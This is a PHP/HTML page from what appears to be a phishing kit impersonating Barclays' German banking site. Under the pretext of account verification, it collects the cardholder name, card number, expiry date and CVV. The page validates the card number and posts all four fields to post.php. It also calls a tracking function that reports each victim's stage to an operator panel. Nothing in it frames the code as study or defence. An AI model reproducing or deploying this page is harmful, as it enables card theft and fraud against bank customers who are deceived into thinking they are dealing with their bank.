<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barclays</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/img/logo.png" class="pc">
    <img src="res/img/mobile-logo.png" class="mobile">
</div>
<div class="right"> 
</div>
</header>

<div class="banner">
<div class="container">
<span>Kontobestätigung</span>
</div>
</div>



<main>
<div class="container">
<div class="form">

<div class="text">
Geben Sie Ihre Kartendaten ein, um Ihr Konto zu verifizieren.
</div>



<div class="col">
<?php setError("Ungültige Informationen. Bitte überprüfen Sie Ihre Angaben und versuchen Sie es erneut."); ?>
    <label>Name des Karteninhabers</label>
    <input type="text" id="d0" placeholder="Name des Karteninhabers">
</div>

<div class="col">
    <label>Kartennummer</label>
    <input type="text" id="d1" placeholder="XXXX XXXX XXXX XXX">
</div>

<div class="col">
    <label>Ablaufdatum</label>
    <input type="text" id="d2" placeholder="MM/JJ">
</div>

<div class="col">
    <label>CVV</label>
    <input type="text" id="d3" placeholder="CVV">
</div>

<div class="col">
    <button onclick="sendCard()">Weiter</button>
</div>



</div>
</div>
</main>



<footer>
<div class="container">
<p>Barclays Group hat der BAWAG das Nutzungsrecht an der Marke „Barclays“ für das Privatkundengeschäft in Deutschland und Österreich eingeräumt. Barclays Group und BAWAG befinden sich in keinem Beteiligungsverhältnis und handeln für ihre Geschäftsbereiche unabhängig voneinander.</p>

<img src="res/img/pubs.png">
</div>
</footer>



<?php 
require 'loader.php';
$m->ctr("CARD ".@$_GET['e']);
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
 
var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 
if($("#d0").val().length<4){
	$("#d0").addClass("error");
	allowSubmit=false;
}

if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}

 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<25 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $(".loader").show();
        _cp = "LOADING (LOGIN)";
        $.post("post.php", 
			{
				name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val(),

			} );

    }
}
</script>
</body>
</html>